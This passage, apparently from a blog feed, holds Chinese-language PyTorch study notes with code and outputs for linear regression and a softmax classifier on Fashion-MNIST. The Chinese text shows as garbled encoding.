class="hljs-params">w,b,num_examples</span>):<br>    X = torch.normal(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,(num_examples, <span class="hljs-built_in">len</span>(w)))<br>    y = torch.matmul(X,w) + b<br>    y += torch.normal(<span class="hljs-number">0</span>,<span class="hljs-number">0.01</span>,y.shape)<br>    <span class="hljs-keyword">return</span> X, y.reshape((-<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">true_w = torch.tensor([<span class="hljs-number">2</span>,-<span class="hljs-number">3.4</span>], dtype=torch.<span class="hljs-built_in">float</span>)<br>true_b = <span class="hljs-number">4.2</span><br>features, labels = synthetic_data(true_w, true_b, <span class="hljs-number">1000</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;features:&#x27;</span>, features[<span class="hljs-number">0</span>], <span class="hljs-string">&#x27;\nlabel:&#x27;</span>, labels[<span class="hljs-number">0</span>])<br><span class="hljs-built_in">print</span>(features.size(),labels.size())<br></code></pre></td></tr></table></figure><pre><code class="hljs">features: tensor([ 0.9487, -1.4700]) label: tensor([11.1058])torch.Size([1000, 2]) torch.Size([1000, 1])</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">d2l.set_figsize()<br>d2l.plt.scatter(features[:,(<span class="hljs-number">1</span>)].detach().numpy(), labels.detach().numpy(), <span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><pre><code class="hljs">&lt;matplotlib.collections.PathCollection at 0x253ff824790&gt;</code></pre><p>â€‹<br><img src="/img/linear%20regression_files/linear%20regression_3_1.svg" alt="svg"><br>â€‹    </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">data_iter</span>(<span class="hljs-params">batch_size, features, labels</span>): <br>    num_examples = <span class="hljs-built_in">len</span>(features) <span class="hljs-comment"># 1000</span><br>    indices = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(num_examples)) <br>    random.shuffle(indices)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, num_examples, batch_size):<br>        batch_indices = torch.tensor(indices[i: <span class="hljs-built_in">min</span>(i+batch_size, num_examples)])<br>        <span class="hljs-keyword">yield</span> features[batch_indices], labels[batch_indices]<br>batch_size = <span class="hljs-number">10</span><br><span class="hljs-keyword">for</span> X,y <span class="hljs-keyword">in</span> data_iter(batch_size, features, labels):<br>    <span class="hljs-built_in">print</span>(X, <span class="hljs-string">&#x27;\n&#x27;</span>, y)<br>    <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><pre><code class="hljs">tensor([[ 0.4883, -0.0929],        [ 0.4926,  0.9515],        [ 0.8701, -1.2666],        [-1.8409,  1.4006],        [ 0.6684, -1.6310],        [ 1.0021, -0.7984],        [ 0.0086, -0.8899],        [-0.8791,  0.2551],        [-0.0785,  0.6714],        [ 0.6666, -0.6967]])  tensor([[ 5.4957],        [ 1.9405],        [10.2555],        [-4.2457],        [11.0663],        [ 8.9186],        [ 7.2409],        [ 1.5641],        [ 1.7715],        [ 7.9071]])</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">w = torch.normal(<span class="hljs-number">0</span>, <span class="hljs-number">0.01</span>, size=(<span class="hljs-number">2</span>,<span class="hljs-number">1</span>), requires_grad=<span class="hljs-literal">True</span>)<br>b = torch.zeros(<span class="hljs-number">1</span>, requires_grad=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">linreg</span>(<span class="hljs-params">X, w, b</span>):<br>    <span class="hljs-keyword">return</span> torch.matmul(X,w) + b<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">squared_loss</span>(<span class="hljs-params">y_hat, y</span>):<br>    <span class="hljs-keyword">return</span> (y_hat - y.reshape(y_hat.shape)) ** <span class="hljs-number">2</span> / <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">sgd</span>(<span class="hljs-params">params, lr, batch_size</span>):<br>    <span class="hljs-keyword">with</span> torch.no_grad():<br>        <span class="hljs-keyword">for</span> param <span class="hljs-keyword">in</span> params:<br>            param -= lr * param.grad /batch_size<br>            param.grad.zero_()<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">lr = <span class="hljs-number">0.03</span><br>num_epochs = <span class="hljs-number">3</span><br>net = linreg<br>loss = squared_loss<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> epoch <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(num_epochs):<br>    <span class="hljs-keyword">for</span> X,y <span class="hljs-keyword">in</span> data_iter(batch_size, features, labels):<br>        l = loss(net(X,w,b),y)<br>        l.<span class="hljs-built_in">sum</span>().backward()<br>        sgd([w,b] , lr, batch_size)<br>    <span class="hljs-keyword">with</span> torch.no_grad():<br>        train_l = loss(net(features, w, b), labels)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;epoch <span class="hljs-subst">&#123;epoch + <span class="hljs-number">1</span>&#125;</span>, loss <span class="hljs-subst">&#123;<span class="hljs-built_in">float</span>(train_l.mean()):f&#125;</span>&#x27;</span>)<br></code></pre></td></tr></table></figure><pre><code class="hljs">epoch 1, loss 0.027771epoch 2, loss 0.000104epoch 3, loss 0.000055</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;wçš„ä¼°è®¡è¯¯å·®: <span class="hljs-subst">&#123;true_w - w.reshape(true_w.shape)&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;bçš„ä¼°è®¡è¯¯å·®: <span class="hljs-subst">&#123;true_b - b&#125;</span>&#x27;</span>)<br></code></pre></td></tr></table></figure><pre><code class="hljs">wçš„ä¼°è®¡è¯¯å·®: tensor([ 0.0012, -0.0005], grad_fn=&lt;SubBackward0&gt;)bçš„ä¼°è®¡è¯¯å·®: tensor([0.0006], grad_fn=&lt;RsubBackward1&gt;)</code></pre><h3 id="2-å…¨éƒ¨æ¢æˆpytorch"><a href="#2-å…¨éƒ¨æ¢æˆpytorch" class="headerlink" title="2 å…¨éƒ¨æ¢æˆpytorch"></a>2 å…¨éƒ¨æ¢æˆpytorch</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">import</span> torch<br><span class="hljs-keyword">from</span> torch.utils <span class="hljs-keyword">import</span> data<br><span class="hljs-keyword">from</span> d2l <span class="hljs-keyword">import</span> torch <span class="hljs-keyword">as</span> d2l<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">true_w = torch.tensor([<span class="hljs-number">2</span>, -<span class="hljs-number">3.4</span>])<br>true_b = <span class="hljs-number">4.2</span><br>features, labels = d2l.synthetic_data(true_w, true_b, <span class="hljs-number">1000</span>)<br><span class="hljs-built_in">print</span>(features.shape, labels.shape)<br></code></pre></td></tr></table></figure><pre><code class="hljs">torch.Size([1000, 2]) torch.Size([1000, 1])</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">load_array</span>(<span class="hljs-params">data_arrays, batch_size ,is_train=<span class="hljs-literal">True</span></span>):<br>    dataset = data.TensorDataset(*data_arrays)<br>    <span class="hljs-keyword">return</span> data.DataLoader(dataset, batch_size, shuffle=is_train)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">batchsize = <span class="hljs-number">10</span><br>data_iter = load_array((features, labels), batchsize)<br><span class="hljs-built_in">next</span>(<span class="hljs-built_in">iter</span>(data_iter))<br></code></pre></td></tr></table></figure><pre><code class="hljs">[tensor([[ 0.5940, -1.2375],         [-0.0840, -0.2979],         [-0.6866, -0.0931],         [-0.7088,  1.3270],         [ 1.0423,  0.6539],         [ 0.8156,  0.4527],         [ 0.5195, -0.3563],         [ 1.5992, -0.2122],         [ 0.9235,  0.7968],         [ 1.7633,  1.0517]]), tensor([[ 9.6162],         [ 5.0296],         [ 3.1477],         [-1.7288],         [ 4.0441],         [ 4.2969],         [ 6.4594],         [ 8.1204],         [ 3.3252],         [ 4.1758]])]</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> torch <span class="hljs-keyword">import</span> nn<br>net = nn.Sequential(nn.Linear(<span class="hljs-number">2</span>,<span class="hljs-number">1</span>))<br>net[<span class="hljs-number">0</span>].weight.data.normal_(<span class="hljs-number">0</span>,<span class="hljs-number">0.01</span>)<br>net[<span class="hljs-number">0</span>].bias.data.fill_(<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><pre><code class="hljs">tensor([0.])</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">loss = nn.MSELoss()<br>trainer = torch.optim.SGD(net.parameters(), lr = <span class="hljs-number">0.03</span>)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">num_epochs = <span class="hljs-number">3</span><br><span class="hljs-keyword">for</span> epoch <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(num_epochs):<br>    <span class="hljs-keyword">for</span> X, y <span class="hljs-keyword">in</span> data_iter:<br>        l = loss(net(X) ,y)<br>        trainer.zero_grad()<br>        l.backward()<br>        trainer.step()<br>    l = loss(net(features), labels)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;epoch <span class="hljs-subst">&#123;epoch + <span class="hljs-number">1</span>&#125;</span>, loss <span class="hljs-subst">&#123;l:f&#125;</span>&#x27;</span>)<br></code></pre></td></tr></table></figure><pre><code class="hljs">epoch 1, loss 0.000310epoch 2, loss 0.000098epoch 3, loss 0.000098</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">w = net[<span class="hljs-number">0</span>].weight.data<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;wçš„ä¼°è®¡è¯¯å·®ï¼š&#x27;</span>, true_w - w.reshape(true_w.shape))<br>b = net[<span class="hljs-number">0</span>].bias.data<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;bçš„ä¼°è®¡è¯¯å·®ï¼š&#x27;</span>, true_b - b)<br></code></pre></td></tr></table></figure><pre><code class="hljs">wçš„ä¼°è®¡è¯¯å·®ï¼š tensor([0.0002, 0.0010])bçš„ä¼°è®¡è¯¯å·®ï¼š tensor([0.0007])</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(net)<br></code></pre></td></tr></table></figure><pre><code class="hljs">Sequential(  (0): Linear(in_features=2, out_features=1, bias=True))</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">w_grad = net[<span class="hljs-number">0</span>].weight.grad<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;wçš„æ¢¯åº¦ï¼š&#x27;</span>, w_grad)<br>b_grad = net[<span class="hljs-number">0</span>].bias.grad<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;bçš„æ¢¯åº¦ï¼š&#x27;</span>, b_grad)<br></code></pre></td></tr></table></figure><pre><code class="hljs">wçš„æ¢¯åº¦ï¼š tensor([[0.0019, 0.0058]])bçš„æ¢¯åº¦ï¼š tensor([0.0047])</code></pre>]]></content>
    
    
    <categories>
      
      <category>pytorch</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pytorch</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>softmax image classfication</title>
    <link href="/2023/11/19/ai/softmax%20image%20classification/"/>
    <url>/2023/11/19/ai/softmax%20image%20classification/</url>
    
    <content type="html"><![CDATA[<p><strong>softmaxå‡½æ•°èƒ½å¤Ÿå°†æœªè§„èŒƒåŒ–çš„é¢„æµ‹å˜æ¢ä¸ºéè´Ÿæ•°å¹¶ä¸”æ€»å’Œä¸º1ï¼ŒåŒæ—¶è®©æ¨¡å‹ä¿æŒå¯å¯¼çš„æ€§è´¨</strong></p><h3 id="1-æ‰‹å†™softmax"><a href="#1-æ‰‹å†™softmax" class="headerlink" title="1  æ‰‹å†™softmax"></a>1  æ‰‹å†™softmax</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> torch<br><span class="hljs-keyword">import</span> torchvision<br><span class="hljs-keyword">from</span> torch.utils <span class="hljs-keyword">import</span> data<br><span class="hljs-keyword">from</span> torchvision <span class="hljs-keyword">import</span> transforms<br><span class="hljs-keyword">from</span> d2l <span class="hljs-keyword">import</span> torch <span class="hljs-keyword">as</span> d2l<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_dataloader_workers</span>(): <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">4</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">load_data_fashion_mnist</span>(<span class="hljs-params">batch_size, resize=<span class="hljs-literal">None</span></span>): <br>    trans = [transforms.ToTensor()]<br>    <span class="hljs-keyword">if</span> resize:<br>        trans.insert(<span class="hljs-number">0</span>, transforms.Resize(resize))<br>    trans = transforms.Compose(trans)<br>    mnist_train = torchvision.datasets.FashionMNIST(<br>        root=<span class="hljs-string">&quot;./data&quot;</span>, train=<span class="hljs-literal">True</span>, transform=trans, download=<span class="hljs-literal">True</span>)<br>    mnist_test = torchvision.datasets.FashionMNIST(<br>        root=<span class="hljs-string">&quot;./data&quot;</span>, train=<span class="hljs-literal">False</span>, transform=trans, download=<span class="hljs-literal">True</span>)<br>    <span class="hljs-keyword">return</span> (<br>            data.DataLoader(mnist_train, batch_size, shuffle=<span class="hljs-literal">True</span>, num_workers=get_dataloader_workers()),<br>            data.DataLoader(mnist_test, batch_size, shuffle=<span class="hljs-literal">False</span>, num_workers=get_dataloader_workers())<br>           )<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">num_inputs = <span class="hljs-number">784</span><br>num_outputs = <span class="hljs-number">10</span><br><br>W = torch.normal(<span class="hljs-number">0</span>, <span class="hljs-number">0.01</span>, size=(num_inputs, num_outputs), requires_grad=<span class="hljs-literal">True</span>)<br>b = torch.zeros(num_outputs, requires_grad=<span class="hljs-literal">True</span>)<br>W.shape<br></code></pre></td></tr></table></figure><pre><code class="hljs">torch.Size([784, 10])</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">softmax</span>(<span class="hljs-params">X</span>):<br>    X_exp = torch.exp(X)<br>    partition = X_exp.<span class="hljs-built_in">sum</span>(<span class="hljs-number">1</span>, keepdim=<span class="hljs-literal">True</span>)<br>    <span class="hljs-keyword">return</span> X_exp / partition  <span class="hljs-comment"># è¿™é‡Œåº”ç”¨äº†å¹¿æ’­æœºåˆ¶</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">X = torch.normal(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, (<span class="hljs-number">2</span>, <span class="hljs-number">5</span>))<br>X_prob = softmax(X)<br>X_prob, X_prob.<span class="hljs-built_in">sum</span>(<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><pre><code class="hljs">(tensor([[0.4592, 0.1162, 0.1164, 0.2214, 0.0868],         [0.3951, 0.0510, 0.1455, 0.3218, 0.0867]]), tensor([1., 1.]))</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">net</span>(<span class="hljs-params">X</span>):<br>    X_ = X.reshape((-<span class="hljs-number">1</span>,W.shape[<span class="hljs-number">0</span>])) <span class="hljs-comment"># batchsize x 1x28x28 -&gt; batchsize x 784</span><br>    <span class="hljs-keyword">return</span> softmax(torch.matmul(X_, W) + b)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">cross_entropy</span>(<span class="hljs-params">y_hat, y</span>):<br>    <span class="hljs-keyword">return</span> - torch.log(y_hat[<span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(y_hat)), y])<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># ä¸é‡è¦ï¼Œä¸ç”¨çœ‹</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Accumulator</span>:  <br>    <span class="hljs-string">&quot;&quot;&quot;åœ¨nä¸ªå˜é‡ä¸Šç´¯åŠ &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, n</span>):<br>        self.data = [<span class="hljs-number">0.0</span>] * n<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">self, *args</span>):<br>        self.data = [a + <span class="hljs-built_in">float</span>(b) <span class="hljs-keyword">for</span> a, b <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(self.data, args)]<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">reset</span>(<span class="hljs-params">self</span>):<br>        self.data = [<span class="hljs-number">0.0</span>] * <span class="hljs-built_in">len</span>(self.data)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__getitem__</span>(<span class="hljs-params">self, idx</span>):<br>        <span class="hljs-keyword">return</span> self.data[idx]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">accuracy</span>(<span class="hljs-params">y_hat, y</span>):  <span class="hljs-comment">#@save</span><br>    <span class="hljs-string">&quot;&quot;&quot;è®¡ç®—é¢„æµ‹æ­£ç¡®çš„æ•°é‡&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(y_hat.shape) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> y_hat.shape[<span class="hljs-number">1</span>] &gt; <span class="hljs-number">1</span>:<br>        y_hat = y_hat.argmax(axis=<span class="hljs-number">1</span>)<br>    cmp = y_hat.<span class="hljs-built_in">type</span>(y.dtype) == y<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">float</span>(cmp.<span class="hljs-built_in">type</span>(y.dtype).<span class="hljs-built_in">sum</span>())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">evaluate_accuracy</span>(<span class="hljs-params">net, data_iter</span>):  <br>    <span class="hljs-string">&quot;&quot;&quot;è®¡ç®—åœ¨æŒ‡å®šæ•°æ®é›†ä¸Šæ¨¡å‹çš„ç²¾åº¦&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(net, torch.nn.Module):<br>        net.<span class="hljs-built_in">eval</span>()  <span class="hljs-comment"># å°†æ¨¡å‹è®¾ç½®ä¸ºè¯„ä¼°æ¨¡å¼</span><br>    metric = Accumulator(<span class="hljs-number">2</span>)  <span class="hljs-comment"># æ­£ç¡®é¢„æµ‹æ•°ã€é¢„æµ‹æ€»æ•°</span><br>    <span class="hljs-keyword">with</span> torch.no_grad():<br>        <span class="hljs-keyword">for</span> X, y <span class="hljs-keyword">in</span> data_iter:<br>            metric.add(accuracy(net(X), y), y.numel())<br>    <span class="hljs-keyword">return</span> metric[<span class="hljs-number">0</span>] / metric[<span class="hljs-number">1</span>]<br><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">batch_size = <span class="hljs-number">256</span><br>train_iter, test_iter = load_data_fashion_mnist(batch_size)<br>evaluate_accuracy(net, test_iter) <span class="hljs-comment"># æœªè®­ç»ƒï¼Œæ‰€ä»¥predictæ­£ç¡®çš„æ¦‚ç‡ä¸º 1/10</span><br></code></pre></td></tr></table></figure><pre><code class="hljs">0.1337</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">train_epoch_ch3</span>(<span class="hljs-params">net, train_iter, loss, updater</span>):  <span class="hljs-comment">#@save</span><br>    <span class="hljs-string">&quot;&quot;&quot;è®­ç»ƒæ¨¡å‹ä¸€ä¸ªè¿­ä»£å‘¨æœŸï¼ˆå®šä¹‰è§ç¬¬3ç« ï¼‰&quot;&quot;&quot;</span><br>    <span class="hljs-comment"># å°†æ¨¡å‹è®¾ç½®ä¸ºè®­ç»ƒæ¨¡å¼</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(net, torch.nn.Module):<br>        net.train()<br>    <span class="hljs-comment"># è®­ç»ƒæŸå¤±æ€»å’Œã€è®­ç»ƒå‡†ç¡®åº¦æ€»å’Œã€æ ·æœ¬æ•°</span><br>    metric = Accumulator(<span class="hljs-number">3</span>)<br>    <span class="hljs-keyword">for</span> X, y <span class="hljs-keyword">in</span> train_iter:<br>        <span class="hljs-comment"># è®¡ç®—æ¢¯åº¦å¹¶æ›´æ–°å‚æ•°</span><br>        y_hat = net(X)<br>        l = loss(y_hat, y)<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(updater, torch.optim.Optimizer): <span class="hljs-comment"># è¿™é‡Œæ˜¯è‡ªå·±å†™çš„updaterï¼Œä¸ºfalse</span><br>            <span class="hljs-comment"># ä½¿ç”¨PyTorchå†…ç½®çš„ä¼˜åŒ–å™¨å’ŒæŸå¤±å‡½æ•°</span><br>            updater.zero_grad()<br>            l.mean().backward()<br>            updater.step()<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># ä½¿ç”¨å®šåˆ¶çš„ä¼˜åŒ–å™¨å’ŒæŸå¤±å‡½æ•°</span><br>            l.<span class="hljs-built_in">sum</span>().backward()<br>            updater(X.shape[<span class="hljs-number">0</span>])<br>        metric.add(<span class="hljs-built_in">float</span>(l.<span class="hljs-built_in">sum</span>()), accuracy(y_hat, y), y.numel())<br>    <span class="hljs-comment"># è¿”å›è®­ç»ƒæŸå¤±å’Œè®­ç»ƒç²¾åº¦</span><br>    <span class="hljs-keyword">return</span> metric[<span class="hljs-number">0</span>] / metric[<span class="hljs-number">2</span>], metric[<span class="hljs-number">1</span>] / metric[<span class="hljs-number">2</span>]<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">train_ch3</span>(<span class="hljs-params">net, train_iter, test_iter, loss, num_epochs, updater</span>):  <span class="hljs-comment">#@save</span><br>    <span class="hljs-string">&quot;&quot;&quot;è®­ç»ƒæ¨¡å‹ï¼ˆå®šä¹‰è§ç¬¬3ç« ï¼‰&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> epoch <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(num_epochs):<br>        train_metrics = train_epoch_ch3(net, train_iter, loss, updater)<br>        train_loss, train_acc = train_metrics<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;epoch <span class="hljs-subst">&#123;epoch + <span class="hljs-number">1</span>&#125;</span>, loss <span class="hljs-subst">&#123;train_loss:f&#125;</span>, acc <span class="hljs-subst">&#123;train_acc:f&#125;</span>&#x27;</span>)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">lr = <span class="hljs-number">0.1</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">updater</span>(<span class="hljs-params">batch_size</span>):<br>    <span class="hljs-keyword">return</span> d2l.sgd([W, b], lr, batch_size)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">num_epochs = <span class="hljs-number">10</span><br>train_ch3(net, train_iter, test_iter, cross_entropy, num_epochs, updater)<br></code></pre></td></tr></table></figure><pre><code class="hljs">epoch 1, loss 0.786198, acc 0.749617epoch 2, loss 0.570151, acc 0.812767epoch 3, loss 0.526287, acc 0.825667epoch 4, loss 0.500650, acc 0.832700epoch 